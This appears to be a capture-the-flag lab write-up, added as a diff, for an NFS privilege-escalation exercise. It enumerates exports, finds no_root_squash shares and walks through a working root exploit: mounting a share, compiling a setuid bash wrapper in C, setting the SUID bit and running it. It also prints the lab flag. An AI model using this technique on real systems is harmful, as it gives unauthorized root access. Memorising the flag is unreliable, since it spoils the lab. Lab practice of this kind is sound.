@@ -1,0 +1,91 @@
+## Digged deep ........
+
+Let's proceed to our task 
+
+# How many mountable shares can you identify on the target system?
+
+run the following command to see the exports :
+
+showmount -e YOUR_VM_IP_ADDRESS 
+
+$ showmount -e 10.10.112.248
+Export list for 10.10.112.248:
+/home/ubuntu/sharedfolder *
+/tmp                      *
+/home/backup              *
+
+
+Anwser: 3
+_______________________________________________________________________
+
+# How many shares have the "no_root_squash" option enabled?
+
+read the contents of export file inside /etc/exports 
+__________________________________________________
+
+$  cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_su
+btree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+$ 
+
+Answer : 3 
+____________________________________________________________________________________
+# What is the content of the flag7.txt file?
+
+This question was very interesting. I tried to break in with different approaches but nothing worked out. 
+Important to note : For solving this task , you'll need to start attackbox or kaliLinux.
+
+As in our first question, we observed the file names which were to be exported on local machine.
+We've /home/ubuntu/sharedfolder avaiable. Let's export this in our attacking machine (Attackbox in this case).
+
+1. root@ip-10-10-198-24:/# mkdir /tmp/sharedfolder (make directory in attackbox)
+2. root@ip-10-10-198-24:/tmp# sudo mount -o rw 10.10.112.248:/home/ubuntu/sharedfolder /tmp/sharedfolder
+   ( mounting from server to local machine - AttackBox in this case)
+3. as directory is mounted , now write script in "C" language to get root access once is run. (coding is below) 
+int main()
+{
+setuid(0);
+setgid(0);
+system("/bin/bash");
+return 0;
+}
+
+4. run this and generate an executable , which once run will give you root access 
+root@ip-10-10-198-24:/tmp/sharedfolder# gcc nfs.c -o nfs -w
+root@ip-10-10-198-24:/tmp/sharedfolder# ls -la
+total 56
+drwxr-xr-x  2 root root  4096 Apr 18 23:03 .
+drwxrwxrwt 13 root root 32768 Apr 18 23:03 ..
+-rwxr-xr-x  1 root root  8392 Apr 18 23:03 nfs
+-rw-r--r--  1 root root    68 Apr 18 23:02 nfs.c
+
+additional tip is to change the nfs file and set "s" permission bit: chmod +s nfs
+It's time to go back to virtual machine and go to /home/ubuntu/sharedfolder 
+Check for permission of nfs .........
+
+# Wiat What, you made it 😎, you got an executable file which once runs will redirect you to root user 
+ 
+5.  run the nfs executable file : ./nfs
+
+Oh!, you're root now , do whatever you want to do .............................
+
+$ cd /home/ubuntu/sharedfolder
+$ ls
+nfs  nfs.c
+$ ./nfs
+root@ip-10-10-112-248:/home/ubuntu/sharedfolder# cat /home/matt/flag7.txt
+THM-89384012
+root@ip-10-10-112-248:/home/ubuntu/sharedfolder# 
